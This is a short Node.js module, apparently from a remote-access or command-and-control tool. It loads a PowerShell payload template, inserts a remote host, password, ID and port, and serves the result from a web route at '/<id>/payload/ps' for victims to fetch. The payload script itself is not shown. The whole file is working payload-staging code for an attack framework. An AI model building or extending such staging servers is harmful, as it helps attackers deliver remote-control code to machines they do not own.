const fs = require('fs');
const path = require("path");

// The location of the payload
const payload_loc = '../payloads/basic_ps_payload.ps1'

module.exports = {
    create_basic_ps_payload : function (id_obj, port, host, app) {
        const password = id_obj.pwd
        const id = id_obj.id
        let payload = fs.readFileSync(path.join(__dirname, payload_loc), 'utf8');
        payload = payload.replace('<REMOTEHOST>', host);
        payload = payload.replace('<PASSWORD>', password);
        payload = payload.replace('<ID>', id);
        payload = payload.replace('<PORT>', port);
        
        app.get('/'+id+'/payload/ps', (req, res) => {
            res.send(payload)
        });
        return app
    }
}
